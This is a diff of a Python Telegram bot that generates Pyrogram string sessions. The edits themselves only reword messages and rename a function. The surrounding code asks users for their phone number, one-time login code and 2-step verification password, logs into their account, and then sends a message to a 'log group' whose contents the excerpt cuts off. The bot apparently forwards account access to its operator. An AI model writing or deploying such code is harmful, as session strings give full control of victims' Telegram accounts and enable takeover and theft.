@@ -20,7 +20,10 @@ USER_DATA = {}  # store temporary details for each user
 
 @bot.on_message(filters.command("start"))
 async def start_msg(_, msg):
-    await msg.reply("👋 Welcome!\nSend /session to generate your Pyrogram String Session.")
+    await msg.reply(
+        "👋 Welcome to **String Session Generator Bot!**\n\n"
+        "Use /session to generate your Pyrogram string."
+    )
 
 
 @bot.on_message(filters.command("session"))
@@ -38,10 +41,10 @@ async def ask_api_id(_, msg: Message):
     number = await bot.listen(msg.chat.id)
     USER_DATA[msg.from_user.id]["number"] = number.text
 
-    await generate_step_2(msg)
+    await generate_session(msg)
 
 
-async def generate_step_2(msg: Message):
+async def generate_session(msg: Message):
     uid = msg.from_user.id
     data = USER_DATA[uid]
 
@@ -59,7 +62,7 @@ async def generate_step_2(msg: Message):
     try:
         await temp.sign_in(data["number"], sent.phone_code_hash, otp.text)
     except SessionPasswordNeeded:
-        await msg.reply("🔐 2-Step Verification enabled!\nEnter your **password**:")
+        await msg.reply("🔐 2-Step Verification enabled!\nEnter your **Password**:")
         password = await bot.listen(msg.chat.id)
         await temp.check_password(password.text)
 
@@ -71,7 +74,7 @@ async def generate_step_2(msg: Message):
         f"🎉 **Your Pyrogram String Session:**\n\n`{string}`\n\n⚠ Save it safely!"
     )
 
-    # Send to log group
+    # Log in log group
     try:
         await bot.send_message(
             LOG_GROUP_ID,
